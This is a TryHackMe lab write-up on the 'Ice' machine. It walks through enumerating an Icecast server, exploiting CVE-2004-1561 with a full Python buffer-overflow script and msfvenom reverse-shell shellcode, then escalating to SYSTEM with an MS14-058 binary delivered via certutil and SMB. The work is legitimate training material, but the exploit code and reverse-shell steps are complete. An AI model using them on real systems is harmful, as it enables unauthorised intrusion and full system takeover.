# 'Ice' from TryHackMe: Manual Exploitation Writeup

## Summary
Ice is an Active Directory machine which is the sequel to 'Blue' on  TryHackMe and the prequel to 'Buster'. 
We start with nmap enumeration and discover the Icecast application on an open port. 
After searching for exploits we manage to find a CVE in the form of an easy buffer overflow which we use to get a shell. 
With the shell active we then use Windows Exploit Suggester to find a privilege escalation pathway (after digging through a large number of options). 
Finally we upload the exploit and our shell executable to the box and have the former execute the latter in order to get a reverse shell as root. 
Please note that we'll effectively be skipping most of the TryHackMe room's steps in order to approach the box in this way.

## Enumeration
First we enumerate the server with nmap:
```
sudo nmap -sS -sV -oN ice.basic 10.10.170.34    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 01:26 EDT
Service scan Timing: About 50.00% done; ETC: 01:27 (0:00:17 remaining)
Nmap scan report for 10.10.170.34
Host is up (0.28s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.54 seconds
```

The most interesting part here is found on port 8000/tcp. We can see that this port is running 'Icecast streaming media server'.

Wikipedia says the following on Icecast: 'Icecast is a streaming media project released as free software maintained by the Xiph.Org Foundation. 
It also refers specifically to the server program which is part of the project.'

Now we'll search for exploits relating to Icecast using searchsploit:

```
searchsploit Icecast                        
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Icecast 1.1.x/1.3.x - Directory Traversal                                                  | multiple/remote/20972.txt
Icecast 1.1.x/1.3.x - Slash File Name Denial of Service                                    | multiple/dos/20973.txt
Icecast 1.3.7/1.3.8 - 'print_client()' Format String                                       | windows/remote/20582.c
Icecast 1.x - AVLLib Buffer Overflow                                                       | unix/remote/21363.c
Icecast 2.0.1 (Win32) - Remote Code Execution (1)                                          | windows/remote/568.c
Icecast 2.0.1 (Win32) - Remote Code Execution (2)                                          | windows/remote/573.c
Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)                                | windows_x86/remote/16763.rb
Icecast 2.x - XSL Parser Multiple Vulnerabilities                                          | multiple/remote/25238.txt
icecast server 1.3.12 - Directory Traversal Information Disclosure                         | linux/remote/21602.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The 'Icecast 2.0.1 (Win32): Remote Code Execution' exploits are the  most interesting two options here. A little bit of Googling leads us to  the following webpage: <https://www.exploit-db.com/exploits/568>
This relates to the this CVE: **CVE-2004-1561**

## Initial Exploitation

### The original buffer overflow code

This is a simple buffer overflow attack that allows us to get remote code execution. It is made using C. The exploit is particularly nice (or dangerous) because we don't need to do any more complex buffer overflow techniques such as using CALL ESP or JMP ESP to  jump to a different part of the program's execution once we get the  buffer overflow to occur. Once we overflow the buffer it immediatly starts overwriting the return  address which allows us to insert shellcode into the program and get a  shell easily.

The most interesting part of the C code begins from line 57 (we don't display most of the shellcode here since it's around 30 lines long):

```
#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ2048 
#define TIMEOUT 3 
#define EXEC"GET / HTTP/1.0rn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "xcc" 

//web download and execution shellcode 
//which downloads http://www.elitehaven.net/ncat.exe 
//this ncat spwans a shell on port 9999 

char shellcode[] = "xEB" 
"x03x59xEBx05xE8xF8xFFxF...
...
...
...
"x36x4Ax37x45x46x42x50x5A";
```

Here we are basically feeding a sequence of 31 empty headers (the  "arn") to Icecast to take up the first 31 locations in the buffer. 
Then we use the "xcc" which is a null byte to signify we'd like to execute what follows. 
This takes up the whole 32 bit buffer and any code we pass past this point will be taken as a part of a 'return' statement. 
Unfortunately we can see here that the shell is attempting to download a binary from <http://www.elitehaven.net/ncat.exe> which is a location that no longer exists. 
Therefore this shell code will not work. But it gives us a nice idea of what we can do from here.

### Icecast.py
After some more looking around for a working exploit, we find the following: <https://github.com/ivanitlearning/CVE-2004-1561>
We can see that the author ivanitlearning (who is a legend) rewrote both the original C version of the exploit as well as writing a Python version. 
In this case we'll be using the Python version which is called **Icecast.py**
The usage is fairly simple. ivanitlearning recommends the following:

```
Replace reverse shell shellcode in exploit, call it with argument for remote server and port.

root@Kali:~/TryHackme/Ice# ./icecast.py 192.168.92.133 8000

Done!
```

#### Generating shellcode with msfvenom

Conveniently, the author includes the msfvenom command we'll want to run in the icecast.py file:
```msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f python -b '\x00\x0a\x0d'```

We use ```-a x86``` to ensure the payload is compatible with 32 bit architecture. ```--platform Windows``` ensures the shell is for a Windows device. 
```-p windows/shell_reverse_tcp``` is used to define the payload. ```LHOST``` should be the VPN IP for the TryHackMe machine while ```LPORT``` is the port that we will listen on with netcat. ```-f python``` ensures that the format for the shellcode is in Python. ```-b '\x00\x0a\x0d'``` excludes three characters from the shellcode. These characters are the null byte, line feed and carriage return respectively.

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.18.56 LPORT=420 -f python -b '\x00\x0a\x0d'  
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xb8\x24\x7b\xaa\x27\xd9\xca\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\x67\x75\x48"
buf += b"\xd2\x9b\x61\x0e\x1d\x63\x72\x6f\x97\x86\x43\xaf\xc3"
buf += b"\xc3\xf4\x1f\x87\x81\xf8\xd4\xc5\x31\x8a\x99\xc1\x36"
buf += b"\x3b\x17\x34\x79\xbc\x04\x04\x18\x3e\x57\x59\xfa\x7f"
buf += b"\x98\xac\xfb\xb8\xc5\x5d\xa9\x11\x81\xf0\x5d\x15\xdf"
buf += b"\xc8\xd6\x65\xf1\x48\x0b\x3d\xf0\x79\x9a\x35\xab\x59"
buf += b"\x1d\x99\xc7\xd3\x05\xfe\xe2\xaa\xbe\x34\x98\x2c\x16"
buf += b"\x05\x61\x82\x57\xa9\x90\xda\x90\x0e\x4b\xa9\xe8\x6c"
buf += b"\xf6\xaa\x2f\x0e\x2c\x3e\xab\xa8\xa7\x98\x17\x48\x6b"
buf += b"\x7e\xdc\x46\xc0\xf4\xba\x4a\xd7\xd9\xb1\x77\x5c\xdc"
buf += b"\x15\xfe\x26\xfb\xb1\x5a\xfc\x62\xe0\x06\x53\x9a\xf2"
buf += b"\xe8\x0c\x3e\x79\x04\x58\x33\x20\x41\xad\x7e\xda\x91"
buf += b"\xb9\x09\xa9\xa3\x66\xa2\x25\x88\xef\x6c\xb2\xef\xc5"
buf += b"\xc9\x2c\x0e\xe6\x29\x65\xd5\xb2\x79\x1d\xfc\xba\x11"
buf += b"\xdd\x01\x6f\xb5\x8d\xad\xc0\x76\x7d\x0e\xb1\x1e\x97"
buf += b"\x81\xee\x3f\x98\x4b\x87\xaa\x63\x1c\xa2\x2e\x79\xe4"
buf += b"\xda\x2c\x7d\x15\xbf\xb8\x9b\x7f\xaf\xec\x34\xe8\x56"
buf += b"\xb5\xce\x89\x97\x63\xab\x8a\x1c\x80\x4c\x44\xd5\xed"
buf += b"\x5e\x31\x15\xb8\x3c\x94\x2a\x16\x28\x7a\xb8\xfd\xa8"
buf += b"\xf5\xa1\xa9\xff\x52\x17\xa0\x95\x4e\x0e\x1a\x8b\x92"
buf += b"\xd6\x65\x0f\x49\x2b\x6b\x8e\x1c\x17\x4f\x80\xd8\x98"
buf += b"\xcb\xf4\xb4\xce\x85\xa2\x72\xb9\x67\x1c\x2d\x16\x2e"
buf += b"\xc8\xa8\x54\xf1\x8e\xb4\xb0\x87\x6e\x04\x6d\xde\x91"
buf += b"\xa9\xf9\xd6\xea\xd7\x99\x19\x21\x5c\xa9\x53\x6b\xf5"
buf += b"\x22\x3a\xfe\x47\x2f\xbd\xd5\x84\x56\x3e\xdf\x74\xad"
buf += b"\x5e\xaa\x71\xe9\xd8\x47\x08\x62\x8d\x67\xbf\x83\x84"
```

Now in order for this exploit to work properly we need to remove all the 'b' characters at the start of each shellcode section.
So this:
```
buf =  b""
buf += b"\xb8\x24\x7b\xaa\x27\xd9\xca\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\x67\x75\x48"
```

Would become this:
```
buf =  ""
buf += "\xb8\x24\x7b\xaa\x27\xd9\xca\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\x67\x75\x48"
```

Now we edit the icecast.py code with out shellcode. The final file in this case would look like this:
```
#!/usr/bin/env python3
##############################################################################################
# How to use:
# 1. Replace 'buf' shellcode below with msfvenom shellcode
# 2. Call it like this: ./icecast.py <target> <port>
# Eg. root@Kali:~# ./icecast.py 192.168.92.133 8000
##############################################################################################
import socket
import sys

host = sys.argv[1] # Receive IP from user
port = int(sys.argv[2]) # Receive Port from user

# Replace with own shellcode here
# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -f python -b '\x00\x0a\x0d'

buf =  ""
buf += "\xb8\x24\x7b\xaa\x27\xd9\xca\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\x67\x75\x48"
buf += "\xd2\x9b\x61\x0e\x1d\x63\x72\x6f\x97\x86\x43\xaf\xc3"
buf += "\xc3\xf4\x1f\x87\x81\xf8\xd4\xc5\x31\x8a\x99\xc1\x36"
buf += "\x3b\x17\x34\x79\xbc\x04\x04\x18\x3e\x57\x59\xfa\x7f"
buf += "\x98\xac\xfb\xb8\xc5\x5d\xa9\x11\x81\xf0\x5d\x15\xdf"
buf += "\xc8\xd6\x65\xf1\x48\x0b\x3d\xf0\x79\x9a\x35\xab\x59"
buf += "\x1d\x99\xc7\xd3\x05\xfe\xe2\xaa\xbe\x34\x98\x2c\x16"
buf += "\x05\x61\x82\x57\xa9\x90\xda\x90\x0e\x4b\xa9\xe8\x6c"
buf += "\xf6\xaa\x2f\x0e\x2c\x3e\xab\xa8\xa7\x98\x17\x48\x6b"
buf += "\x7e\xdc\x46\xc0\xf4\xba\x4a\xd7\xd9\xb1\x77\x5c\xdc"
buf += "\x15\xfe\x26\xfb\xb1\x5a\xfc\x62\xe0\x06\x53\x9a\xf2"
buf += "\xe8\x0c\x3e\x79\x04\x58\x33\x20\x41\xad\x7e\xda\x91"
buf += "\xb9\x09\xa9\xa3\x66\xa2\x25\x88\xef\x6c\xb2\xef\xc5"
buf += "\xc9\x2c\x0e\xe6\x29\x65\xd5\xb2\x79\x1d\xfc\xba\x11"
buf += "\xdd\x01\x6f\xb5\x8d\xad\xc0\x76\x7d\x0e\xb1\x1e\x97"
buf += "\x81\xee\x3f\x98\x4b\x87\xaa\x63\x1c\xa2\x2e\x79\xe4"
buf += "\xda\x2c\x7d\x15\xbf\xb8\x9b\x7f\xaf\xec\x34\xe8\x56"
buf += "\xb5\xce\x89\x97\x63\xab\x8a\x1c\x80\x4c\x44\xd5\xed"
buf += "\x5e\x31\x15\xb8\x3c\x94\x2a\x16\x28\x7a\xb8\xfd\xa8"
buf += "\xf5\xa1\xa9\xff\x52\x17\xa0\x95\x4e\x0e\x1a\x8b\x92"
buf += "\xd6\x65\x0f\x49\x2b\x6b\x8e\x1c\x17\x4f\x80\xd8\x98"
buf += "\xcb\xf4\xb4\xce\x85\xa2\x72\xb9\x67\x1c\x2d\x16\x2e"
buf += "\xc8\xa8\x54\xf1\x8e\xb4\xb0\x87\x6e\x04\x6d\xde\x91"
buf += "\xa9\xf9\xd6\xea\xd7\x99\x19\x21\x5c\xa9\x53\x6b\xf5"
buf += "\x22\x3a\xfe\x47\x2f\xbd\xd5\x84\x56\x3e\xdf\x74\xad"
buf += "\x5e\xaa\x71\xe9\xd8\x47\x08\x62\x8d\x67\xbf\x83\x84"

evul = "\xeb\x0c" + " / HTTP/1.1 " + buf + "\r\n" + "Accept: text/html\r\n"*31
evul += "\xff\x64\x24\x04" + "\r\n\r\n"  # jmp [esp+4] 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
client.connect((host,port))                               #Connect to TCP socket
client.sendall(evul.encode('latin-1'))	                                # Send buffer overflow
client.close()

print("\nDone!")
```

At this stage it's time to set up our netcat listener:

```
nc -lvnp 420
listening on [any] 420 ...
```

And now we run the exploit:

```
python3 icecast.py 10.10.170.34 8000

Done!
```

If we look back at our netcat listener now:

```
listening on [any] 420 ...                                    
connect to [10.4.18.56] from (UNKNOWN) [10.10.170.34] 49284
Microsoft Windows [Version 6.1.7601]              
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
                                                              
C:\Program Files (x86)\Icecast2 Win32>whoami
whoami
dark-pc\dark
```

We've got a shell as the user Dark!

### Privilege Escalation
Now that we have a shell we have a number of ways of trying to identify valid pathways for privilege escalation. 
This time we're going to use the Windows Exploit Suggester. It's available here: <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

We needed to install pip for python2 and install the xlrd module before it would run: 

```
#wget the get-pip.py file 
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py 
#Run the file with python2 get-pip.py 
python2 get-pip 
#Install xlrd==1.1.0 python2 -m pip install --user xlrd==1.1.0 
```

Before we can use the exploit suggester, we first have to get the Windows system information. We can do this with systeminfo:

```
C:\Program Files (x86)\Icecast2 Win32>systeminfo
systeminfo

Host Name:                 DARK-PC
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Dark
Registered Organization:   
Product ID:                00371-177-0000061-85305
Original Install Date:     11/12/2019, 4:48:23 PM
System Boot Time:          9/22/2021, 12:18:37 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,498 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,476 MB
Virtual Memory: In Use:    619 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\DARK-PC
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.170.34
                                 [02]: fe80::99a0:7d8:5e3f:1beb
```

We can then copy this output and save it to a text file, which in this case we'll name 'sysinfo.txt'.

At this stage we'll want to run Windows-Exploit-Suggester. First we'll need to use the ```-u``` flag to get the latest definitions file:
```
sudo python windows-exploit-suggester.py -u 
[*] initiating winsploit version 3.3...
[+] writing to file 2021-09-22-mssb.xls
[*] done
```

Now we can run the exploit suggester against the sysinfo.txt file:

```
python windows-exploit-suggester.py -d 2021-09-22-mssb.xls -i sysinfo.txt -l                                 
[*] initiating winsploit version 3.3...                                                                              
[*] database file detected as xls or xlsx based on extension                                                         
[*] attempting to read from the systeminfo input file     
[+] systeminfo input file read successfully (ascii)                                                                  
[*] querying database file for potential vulnerabilities                                                             
[*] comparing the 2 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits          
[*] there are now 386 remaining vulns                                                                                
[*] searching for local exploits only
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
[*] 
...
```

We do not include all the output as there are quite a number of local vulnerabilities. But we do find the following:

```
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
```

The exploit doesn't seem to directly relate to our needs but if we Google MS14-058 we can find this GitHub repository:
<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058>

It appears that by using the Win64.exe executable found at the repository, as long as we can get it onto the box, we should be able to run commands as NT AUTHORITY\SYSTEM (root). For example:

```
Win64.exe whoami
nt authority\system
```

### Using Gitmaninc's MS14-058 Privilege Escalation from SecWiki

Firstly we need to create a new reverse shell that we can execute on the box locally. To do this we'll run this msfvenom command:

``` 
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.18.56 LPORT=421 -f exe -b '\x00\x0a\x0d' -o paperboy.exe
```

The only things we change here from the previous shell is to use a different port ```LPORT=421``` and ```-f exe``` to ensure we get an executable as the output. ```-o paperboy.exe``` outputs the shell a file with the name 'paperboy.exe'.

Once we've done this we can grab the archive for the MS14-058 exploit from:
<https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar>

We can extract this archive and grab Win64.exe from it. We move the paperboy.exe reverse shell and the Win64.exe file to a folder. Next we want to upload the files to the box. 

##### Transferring exploit code to the box

###### With CertUtil

In this case from the directory ```~/Boxes/Ice/share``` on our attack box we can host a Python HTTP server with ```python3 -m http.server 8000```.

From our shell on the box we type the following to transfer our files from our attack box to Ice:

```
C:\Users\Dark\Downloads>certutil.exe -urlcache -f http://10.4.18.56:8000/Win64.exe Win64.exe
certutil.exe -urlcache -f http://10.4.18.56:8000/Win64.exe Win64.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Dark\Downloads>certutil.exe -urlcache -f http://10.4.18.56:8000/paperboy.exe paperboy.exe
certutil.exe -urlcache -f http://10.4.18.56:8000/paperboy.exe paperboy.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

###### With smbserver.py
First we can copy smbserver.py from <https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py> into our directory with the paperboy.exe and Win64.exe executables:

```
cp /opt/impacket/examples/smbserver.py ~/Boxes/Ice/share
```

or

```
cd ~/Boxes/Ice/share
wget https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
```

Then we can execute the script to start the server from that directory:

```
sudo python3 smbserver.py PAPERBOY .                                                                                                                                                                                               130 ⨯
Impacket v0.9.24.dev1+20210917.161743.0297480b - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```PAPERBOY``` is the name of the share and the ```.``` represents the present working directory ```(pwd)```.

Now from the reverse shell on Ice we can use ```net view``` to connect to the ```PAPERBOY``` samba share via our attack machines IP:

```
C:\Users\Dark\Downloads>net view \\10.4.18.56 
net view \\10.4.18.56
Shared resources at \\10.4.18.56

(null)

Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
PAPERBOY    Disk                    
The command completed successfully.
```

```dir``` will list the files in our samba share:

```
C:\Users\Dark\Downloads>dir \\10.4.18.56\PAPERBOY

dir \\10.4.18.56\PAPERBOY

 Volume in drive \\10.4.18.56\PAPERBOY has no label.

 Volume Serial Number is ABCD-EFAA

 Directory of \\10.4.18.56\PAPERBOY

09/23/2021  09:34 AM    <DIR>          .
09/23/2021  09:35 AM    <DIR>          ..
09/23/2021  09:34 AM            73,802 paperboy.exe
09/23/2021  10:32 AM             4,379 smbserver.py
05/04/2014  10:57 AM            55,808 Win64.exe
               3 File(s)        142,181 bytes
               2 Dir(s)  15,207,469,056 bytes free
```

Then we use ```copy``` to transfer the files across:

```
C:\Users\Dark\Downloads>copy \\10.4.18.56\PAPERBOY\paperboy.exe
copy \\10.4.18.56\PAPERBOY\paperboy.exe
        1 file(s) copied.

C:\Users\Dark\Downloads>copy \\10.4.18.56\PAPERBOY\Win64.exe
copy \\10.4.18.56\PAPERBOY\Win64.exe
        1 file(s) copied.
```

#### Getting Root

With the files transferred across all that there's left to do is start a new listener on a different port from the last one we used:

```nc -lvnp 421```

And then execute the Win64.exe binary and have it execute our reverse shell in turn:
```
C:\Users\Dark\Downloads>Win64.exe paperboy.exe
Win64.exe paperboy.exe
```

If we look back at our listener now we will see that we've receieved a shell and are now **root** aka NT AUTHORITY\SYSTEM!:

```
listening on [any] 421 ...
connect to [10.4.18.56] from (UNKNOWN) [10.10.82.92] 49198
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Dark\Downloads>whoami
whoami
nt authority\system
```

## Conclusion & Credits
This was a fun box to learn how to exploit manually and is a great test case for learning about a very simple buffer overflow.

Thanks to the following for their work in creating some of the tools used and guiding me on their usage:
* HackerSploit for their Ice Manual Exploitation video: <https://www.youtube.com/watch?v=eIy69zUfbgI>
* Gitmaninc for the Win64.exe exploit code: <https://github.com/Gitmaninc>
* Luigi Auriemma for the original exploit: <http://aluigi.altervista.org/adv/iceexec-adv.txt>
* SecWiki for their Windows Kernel Exploits: <https://github.com/SecWiki/>
* SecureAuthCorp for Impacket: <https://github.com/SecureAuthCorp/>
* AonCyberLabs for the Windows Exploit Suggester: <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>
  
  

